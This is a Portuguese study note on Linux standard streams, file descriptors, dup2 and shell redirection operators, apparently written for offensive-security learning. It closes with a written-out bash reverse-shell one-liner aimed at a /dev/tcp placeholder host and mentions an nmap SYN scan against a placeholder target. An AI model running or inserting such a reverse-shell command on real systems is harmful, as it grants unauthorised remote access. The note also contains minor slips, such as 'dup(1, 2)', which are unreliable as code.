Em sistemas Linux, uma stream é um canal de I/O (Input/Output) para comunicação entre processos. Todos os processos Linux possuem três canais padrão que são comumente referenciadas por números inteiros, chamados de **file descriptors**:

| Stream                     | File Descriptor (FD) | Descrição                                            |
| -------------------------- | -------------------- | ---------------------------------------------------- |
| Standard Input (`stdin`)   | `0`                  | Canal pelo qual o programa lê dados de entrada       |
| Standard Output (`stdout`) | `1`                  | Canal pelo qual o programa escreve sua saída normal  |
| Standard Error (`stderr`)  | `2`                  | Canal pelo qual o programa escreve sua saída de erro |
# File descriptors e Open file description

Um **file descriptor** é nada mais nada menos do que um inteiro positivo que serve como identificador de um **open file description**, que por sua vez é uma estrutura que contém informações sobre um recurso do kernel que possui interface de stream (arquivo, socket de rede, pipe para IPC etc). Essas informações são, por exemplo, o offset atual para leitura da stream, flags de acesso à stream (`O_RDONLY`, `O_WRONLY`, `O_RDWR`, `O_APPEND`) etc. 

Cada processo possui sua própria tabela de **file descriptors** que é automaticamente preenchida com os file descriptors para as streams padrão abertas para aquele processo (`stdin (0)`, `stdout (1)` e `stderr (2)`).

Exemplo de código em C:

```c
char buffer[] = "hello world";
size_t buffer_len = sizeof(buffer);

write(1, buffer, buffer_len); // OK, escrita em stdout
write(0, buffer, buffer_len); // Erro, escrita em stdin, que é readonly
```


Ainda em C, é possível mudar qual **open file description** um **file descriptor** aponta, ou seja, o identificador permanece o mesmo, mas ele passa referenciar outro recurso com interface de stream. Exemplo:

```C
int log_fd = open("log.txt", O_WRONLY | O_APPEND | O_CREAT, 0644); // cria um open file description para o arquivo "log.txt" e retorna um file descriptor

dup2(log_fd, 1); // stdout (1) referencia o mesmo open file description referenciado por log_fd

char buffer[] = "hello world";
write(1, buffer, sizeof(buffer)); // mesmo usando o fd da saída padrão, a saída é impressa em "log.txt" ao invés de no terminal
```

Poderíamos até mesmo fazer com que `stderr` aponte para o mesmo open file description de `stdout`:

```C
dup(1, 2); // stderr (2) agora referencia stdout (1)

char buffer[] = "hello world";
write(2, buffer, sizeof(buffer)); // tudo o que é mandado para stderr, na verdade vai para stdout
```

Também podemos manipular o apontado do file descriptor da entrada padrão:

```c
int in_fd = open("input.txt", O_RDONLY);

dup2(in_fd, 0);

char buffer[50] = {0};
read(0, buffer, sizeof(buffer)); // é lido, na verdade, o arquivo "input.txt"

puts(buffer);
```

Toda essa manipulação de streams que podem ser feitas por um processo também podem ser feitas diretamente pelo terminal. É graças a isso, por exemplo, que conseguimos fazer algo como `cat ip_log.txt | sort | uniq -c` ou `nmap -sS --top-ports=1000 --open [TARGET] > open_ports.txt`

# Operadores de redirecionamento de stream

Através do terminal, é possível manipular essas streams através de operadores de redirecionamento, tais como: `pipe`, `>` e `<`. 

> [!note] Significado de "redirecionamento"
> Note que o termo "redirecionamento" se refere aos apontamentos da tabela de **file descriptor**, explicada anteriormente. Ou seja, se a saída de um processo é "redirecionada" para um arquivo `X`, isso significa que o **file descriptor** `1` agora aponta para o **open file description** de `X` e não mais para a saída do terminal.


## Pipe

O operador `pipe` representado por `|` é um operador que redireciona a saída de um programa para o canal de input do programa seguinte. Esse tipo de redirecionamento é utilizado para processar uma stream de dados:

```shell
$ cat file.txt | grep "foo"
```

No exemplo acima, a saída de `cat` é um conteúdo em texto que é redirecionado para a entrada de `grep`, filtrando apenas as linhas contendo texto `foo`. A saída de `grep` também é uma stream de dados e pode continuar a ser redirecionada para outros programas, como `sed`, `sort` etc ou até mesmo para um arquivo com `> output.txt`.

## Redirecionar Output (`>`)

O operador de redirecionamento de output `>` é muito utilizado para redirecionar a stream de saída para um arquivo. Por exemplo:

```shell
$ cat file.txt | grep "foo" > foo.txt
```

Como o output é constituído de duas streams diferentes (`stdout` e `stderr`) é possível escolher qual a stream de output que será redirecionado e para isso basta combinar o operador com o file descriptor desejado:

```shell
$ ls /dir1 /dir2 /not-found-dir /forbidden-dir 1> ok.txt 2> error.txt
```

> [!note] `>` sem file descriptor e `&>`
> Caso o operador `>` seja utilizado sem um **file descriptor**, é assumido o comportamento de `1>`, ou seja, apenas a saída padrão será redirecionada.
> 
> Caso queria redirecionar **ambas** saídas (`stdout` e `stderr`) de uma só vez, basta usar o atalho `&>`.

O `ls` redireciona a listagem dos diretórios válidos para a saída padrão `stdout (1)`, enquanto a saída de diretórios inválidos (inexistentes ou sem permissão de acesso) para `stderr (2)`.

Sabendo disto, conseguimos separar as saídas em dois arquivos diferentes. A notação `1>` faz com que apenas a saída padrão seja redirecionada para o arquivo `ok.txt`, enquanto `2>` redireciona a saída de erro padrão para `error.txt`.

> [!tip] Redirecionar output com **append**
> Caso o arquivo de destino do redirecionamento já exista e você queira incrementá-lo com conteúdo, é possível utilizar o operador de redirecionamento de output em modo **append** (`>>`), ou seja, ele não limpará o arquivo de destino, mas adicionará o conteúdo ao final.
> 
> ```shell
> $ ls /dir1 /dir2 /not-found-dir /forbidden-dir 1> ok.txt 2> error.txt
> $ ls /dir3 /forbidden-dir-2 1>> ok.txt 2>> error.txt
> ```

> [!tip] Redirecionar para `/dev/null`
> Caso o conteúdo de alguma saída não seja desejado, basta redirecioná-lo para `/dev/null`:
> 
> ```shell
> $ ls /dir1 /forbidden-dir 1> ok.txt 2> /dev/null
> ```
> 
> No exemplo acima, tudo enviado para `stderr` será ignorado.

## Redirecionar Input (`<`)

O redirecionamento de output envia a stream de saída de um programa para um arquivo, mas também é possível fazer o processo contrário: redirecionar o conteúdo de um arquivo para a entrada do programa. Isso é alcançado com o operador `<`.

```shell
$ grep "foo" < file.txt
```

## Redirecionar stream para outra stream (`[x]>&y`)

Com o operador `>` também é possível redirecionar uma stream para outra stream que não seja um arquivo. 

Por exemplo, a seguinte expressão com o atalho `&>`:

```shell
$ ls /dir3 /forbidden-dir-2 &> output.txt
# redireciona stdout e stderr para output.txt
```

também poderia ser escrita da seguinte forma mais extensa:

```shell
$ ls /dir3 /forbidden-dir-2 > output.txt 2>&1
```

O bash interpreta a expressão da seguinte forma:
1. `stdout (1)` de `ls`, que antes apontava para o terminal, agora aponta para `output.txt` (`ls ... > output.txt`).
2. `stderr (2)` de `ls`, que antes apontava para o terminal, agora aponta para quem `stdout (1)` aponta (`2>&1`). Como `stdout (1)` aponta para `output.txt`, então `stderr (2)` também apontará para o mesmo arquivo.
3. executa `ls` com os redirecionamentos aplicados


> [!warning] Cuidado para não omitir o `&`
> Se você escrever `2>1` no lugar de `2>&1`, o que acontecerá é que a saída de erro `stderr (2)` será redirecionada para um arquivo de nome `1` ao invés de para quem o **file descriptor** `1` aponta.

---

A princípio isso não parece ser muito útil, já que o atalho `&>` é mais simples. Contudo, é possível redirecionar até mesmo a entrada padrão com este método. Por exemplo:

```shell
bash -i &> /dev/tcp/[TARGET]/[PORT] 0>&1
```

O bash interpreta a expressão da seguinte forma:
1. `stdout (1)` e `stderr (2)` de `bash`, que antes apontavam para o terminal, agora apontam para `/dev/tcp/[TARGET]/[PORT]`. Para mais detalhes sobre este "arquivo", ver [[1. _dev_tcp|/dev/tcp]] (de forma resumida, é um comando especial que se comporta como um socket tcp).
2. `stdin (0)` de `bash`, que antes apontava para o terminal, agora aponta para quem `stdout (1)` aponta (`0>&1`). Como `stdout (1)` aponta para o socket, então `stdin (1)` também apontará para o mesmo socket.
3. invoca um novo `bash` interativo com os redirecionamentos aplicados.

O resultado da expressão acima é que o novo `bash` lerá sua entrada do socket tcp, e tudo o que o bash tiver como saída padrão também será escrito o socket. Isso se comporta como um [[5. Reverse Shell]].
